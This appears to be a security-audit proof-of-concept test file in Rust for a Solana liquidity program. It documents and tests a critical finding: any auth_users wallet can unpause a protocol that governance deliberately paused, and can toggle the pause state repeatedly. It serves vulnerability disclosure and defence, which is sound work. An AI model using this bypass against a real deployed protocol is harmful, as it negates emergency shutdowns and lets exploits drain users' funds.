//! [C-2] CRITICAL — Any `auth_user` Can Unpause a Deliberately-Paused Protocol
//!
//! # Vulnerability
//!
//! The `change_status` instruction (liquidity program) uses the `auth_users` list
//! for **both** pause and unpause operations.  There is no restriction that limits
//! the unpause operation to the governance authority.
//!
//! ```text
//! // liquidity/src/state/context.rs
//! pub struct ChangeStatus<'info> {
//!     pub authority: Signer<'info>,
//!     #[account(mut)]
//!     pub liquidity: Account<'info, Liquidity>,
//!     #[account(constraint = auth_list.auth_users.contains(&authority.key()) @ ...)]
//!     pub auth_list: Account<'info, AuthorizationList>,
//! }
//! ```
//!
//! ```text
//! // liquidity/src/module/admin.rs
//! pub fn change_status(context: Context<ChangeStatus>, status: bool) -> Result<()> {
//!     if context.accounts.liquidity.status == status {
//!         return Err(ErrorCodes::StatusAlreadySet.into());
//!     }
//!     context.accounts.liquidity.status = status;   // ← no role check on direction
//!     ...
//! }
//! ```
//!
//! # Exploit Scenario
//!
//! 1. An active exploit is discovered (e.g., a reentrancy / oracle manipulation).
//! 2. Governance (the protocol authority) calls `change_status(true)` to pause
//!    all user operations while the team evaluates the damage.
//! 3. An attacker who controls any of the up to 10 `auth_users` wallets — which
//!    includes automated keeper bots, sub-signers, and partner protocol PDAs —
//!    calls `change_status(false)` with their key.
//! 4. The protocol is immediately unpaused.  The exploit resumes.
//!
//! # Impact
//!
//! * The emergency pause — the **last line of defence** against an active exploit —
//!   is fully negated.
//! * A single compromised keeper key (lower-privilege than governance) is sufficient.
//! * The only current mitigation is to also remove the attacker from `auth_users`,
//!   but `update_auths` itself requires governance authority, not auth_users, so
//!   it would race against further unpause calls.
//!
//! # Tests
//!
//! `test_c2_governance_pauses_protocol` — verifies the happy-path: governance
//! (authority) can pause the protocol.
//!
//! `test_c2_auth_user_bypasses_emergency_pause` — proves the vulnerability: after governance
//! pauses, a second wallet that is merely in `auth_users` (not the authority)
//! can immediately unpause.
//!
//! `test_c2_non_auth_user_cannot_unpause` — confirms the existing control works as
//! expected for wallets that are NOT in `auth_users`, so the bug is specifically
//! about the role confusion, not a total absence of access control.

#[cfg(test)]
mod tests {
    use crate::liquidity::fixture::LiquidityFixture;
    use fluid_test_framework::prelude::*;
    use liquidity::accounts::ChangeStatus;
    use solana_sdk::instruction::Instruction;
    use anchor_lang::{InstructionData, ToAccountMetas};

    const LIQUIDITY_PROGRAM_ID: Pubkey = liquidity::ID;

    // -----------------------------------------------------------------------
    // Helper: build a `change_status` instruction
    // -----------------------------------------------------------------------
    fn build_change_status_ix(
        fixture: &LiquidityFixture,
        signer: &Pubkey,
        status: bool,
    ) -> Instruction {
        let accounts = ChangeStatus {
            authority: *signer,
            liquidity: fixture.get_liquidity(),
            auth_list: fixture.get_auth_list(),
        };
        Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: accounts.to_account_metas(None),
            data: liquidity::instruction::ChangeStatus { status }.data(),
        }
    }

    // -----------------------------------------------------------------------
    // Shared helper: build a fully-initialised fixture with two auth users:
    //   admin  → governance / authority
    //   admin2 → keeper / sub-signer with `auth_users` membership
    // -----------------------------------------------------------------------
    fn setup_paused_fixture() -> LiquidityFixture {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");

        // Init liquidity with admin as authority
        fixture.init_liquidity().expect("init_liquidity failed");

        // Add admin2 to auth_users (simulating a keeper / partner bot)
        fixture.update_auths().expect("update_auths failed");

        // Governance pauses the protocol (status = true)
        let admin_pubkey = fixture.admin.pubkey();
        let ix = build_change_status_ix(&fixture, &admin_pubkey, true);
        fixture.vm.prank(admin_pubkey);
        fixture
            .vm
            .execute_as_prank(ix)
            .expect("Governance should be able to pause");

        // Assert: protocol is paused
        let liquidity = fixture
            .read_liquidity()
            .expect("Failed to read liquidity");
        assert!(
            liquidity.status,
            "Protocol should be paused after governance call"
        );

        fixture
    }

    // -----------------------------------------------------------------------
    // C-2 PoC #1 — Happy-path: governance can pause
    // -----------------------------------------------------------------------
    /// Verify the baseline: the authority (governance key) can successfully
    /// call `change_status(true)` to pause the protocol.
    #[test]
    fn test_c2_governance_pauses_protocol() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");
        fixture.init_liquidity().expect("init_liquidity failed");

        // Add admin2 to auth_users
        fixture.update_auths().expect("update_auths failed");

        let admin_pubkey = fixture.admin.pubkey();

        // Governance pauses
        let ix = build_change_status_ix(&fixture, &admin_pubkey, true);
        fixture.vm.prank(admin_pubkey);
        let result = fixture.vm.execute_as_prank(ix);
        assert!(
            result.is_ok(),
            "Governance should be able to pause: {:?}",
            result.unwrap_err()
        );

        let liquidity = fixture.read_liquidity().expect("Failed to read liquidity");
        assert!(liquidity.status, "Protocol should be paused");

        println!("\n[C-2 baseline] Governance successfully paused the protocol.");
    }

    // -----------------------------------------------------------------------
    // C-2 PoC #2 — EXPLOIT: keeper bypasses emergency pause
    // -----------------------------------------------------------------------
    /// This test proves [C-2]:
    ///
    /// 1. Governance pauses the protocol (status = true).
    /// 2. An `auth_user` that is NOT the authority calls `change_status(false)`.
    /// 3. The call succeeds → protocol is unpaused.
    ///
    /// Any wallet in `auth_users` (keeper bots, partner protocol PDAs, …) can
    /// neutralise an emergency shutdown triggered by governance.
    #[test]
    fn test_c2_auth_user_bypasses_emergency_pause() {
        // Setup: governance has already paused
        let mut fixture = setup_paused_fixture();

        let admin2_pubkey = fixture.admin2.pubkey();

        // Sanity: admin2 is in auth_users but is NOT the authority
        let auth_list = fixture.read_auth_list().expect("Failed to read auth_list");
        assert!(
            auth_list.auth_users.contains(&admin2_pubkey),
            "admin2 must be in auth_users for this test to be valid"
        );
        let liquidity = fixture.read_liquidity().expect("Failed to read liquidity");
        assert_ne!(
            liquidity.authority, admin2_pubkey,
            "admin2 must NOT be the authority for this test to be valid"
        );

        // ── EXPLOIT ─────────────────────────────────────────────────────────
        // admin2 (keeper / sub-signer, NOT governance) calls change_status(false)
        let ix = build_change_status_ix(&fixture, &admin2_pubkey, false);
        fixture.vm.prank(admin2_pubkey);
        let result = fixture.vm.execute_as_prank(ix);
        // ────────────────────────────────────────────────────────────────────

        assert!(
            result.is_ok(),
            "[C-2] EXPLOIT FAILED — auth_user should be able to unpause but got: {:?}",
            result.unwrap_err()
        );

        // The protocol is now unpaused despite governance's explicit pause
        let liquidity = fixture.read_liquidity().expect("Failed to read liquidity");
        assert!(
            !liquidity.status,
            "[C-2] Protocol should be UNPAUSED after auth_user called change_status(false)"
        );

        println!(
            "\n[C-2 PROVEN] auth_user ({}) successfully unpaused the protocol.\n\
             Governance ({}) had explicitly paused it, but the pause is ineffective\n\
             because any of the {} auth_users can reverse it.\n\
             Impact: emergency shutdown is NOT a reliable safety mechanism.\n\
             An active exploit can continue even after governance pauses.",
            admin2_pubkey,
            fixture.admin.pubkey(),
            auth_list.auth_users.len()
        );
    }

    // -----------------------------------------------------------------------
    // C-2 PoC #3 — Control: non-auth wallet cannot unpause
    // -----------------------------------------------------------------------
    /// A wallet that is NOT in `auth_users` cannot call `change_status` at all.
    /// This confirms the existing access-control gate works, but the role
    /// distinction between "pause" and "unpause" is missing.
    #[test]
    fn test_c2_non_auth_user_cannot_unpause() {
        let mut fixture = setup_paused_fixture();

        // Bob is NOT in auth_users
        let bob_pubkey = fixture.bob.pubkey();
        let auth_list = fixture.read_auth_list().expect("Failed to read auth_list");
        assert!(
            !auth_list.auth_users.contains(&bob_pubkey),
            "bob must NOT be in auth_users for this control test"
        );

        // Bob tries to unpause — must fail
        let ix = build_change_status_ix(&fixture, &bob_pubkey, false);
        fixture.vm.prank(bob_pubkey);
        let result = fixture.vm.execute_as_prank(ix);

        assert!(
            result.is_err(),
            "[C-2 control] Non-auth wallet should NOT be able to unpause, but call succeeded"
        );

        // Protocol remains paused
        let liquidity = fixture.read_liquidity().expect("Failed to read liquidity");
        assert!(
            liquidity.status,
            "[C-2 control] Protocol should still be paused after non-auth attempt"
        );

        println!(
            "\n[C-2 control] Non-auth wallet correctly blocked from calling change_status.\n\
             Error: {:?}\n\
             This confirms the gate exists; the bug is role confusion \
             (auth_users can both pause AND unpause).",
            result.unwrap_err()
        );
    }

    // -----------------------------------------------------------------------
    // C-2 PoC #4 — Repeated unpause / pause cycle by auth_user
    // -----------------------------------------------------------------------
    /// Demonstrates that an attacker with an `auth_user` key can toggle the
    /// pause state arbitrarily, completely negating governance control.
    #[test]
    fn test_c2_auth_user_can_toggle_pause_state_repeatedly() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");
        fixture.init_liquidity().expect("init_liquidity failed");
        fixture.update_auths().expect("update_auths failed");

        let admin_pubkey = fixture.admin.pubkey();
        let admin2_pubkey = fixture.admin2.pubkey();

        // Round 1: governance pauses
        let ix = build_change_status_ix(&fixture, &admin_pubkey, true);
        fixture.vm.prank(admin_pubkey);
        fixture.vm.execute_as_prank(ix).expect("governance pause 1");
        assert!(
            fixture.read_liquidity().unwrap().status,
            "Should be paused after round 1"
        );

        // Round 1: auth_user unpauses
        let ix = build_change_status_ix(&fixture, &admin2_pubkey, false);
        fixture.vm.prank(admin2_pubkey);
        fixture.vm.execute_as_prank(ix).expect("auth_user unpause 1");
        assert!(
            !fixture.read_liquidity().unwrap().status,
            "Should be unpaused after round 1 attacker call"
        );

        // Round 2: governance pauses again
        let ix = build_change_status_ix(&fixture, &admin_pubkey, true);
        fixture.vm.prank(admin_pubkey);
        fixture.vm.execute_as_prank(ix).expect("governance pause 2");
        assert!(
            fixture.read_liquidity().unwrap().status,
            "Should be paused after round 2"
        );

        // Round 2: auth_user unpauses again
        let ix = build_change_status_ix(&fixture, &admin2_pubkey, false);
        fixture.vm.prank(admin2_pubkey);
        fixture.vm.execute_as_prank(ix).expect("auth_user unpause 2");
        assert!(
            !fixture.read_liquidity().unwrap().status,
            "Should be unpaused after round 2 attacker call"
        );

        println!(
            "\n[C-2 PROVEN — toggle] auth_user ({}) toggled pause state 2 times.\n\
             Every governance pause was immediately reversed.\n\
             The emergency mechanism is completely ineffective.",
            admin2_pubkey
        );
    }
}
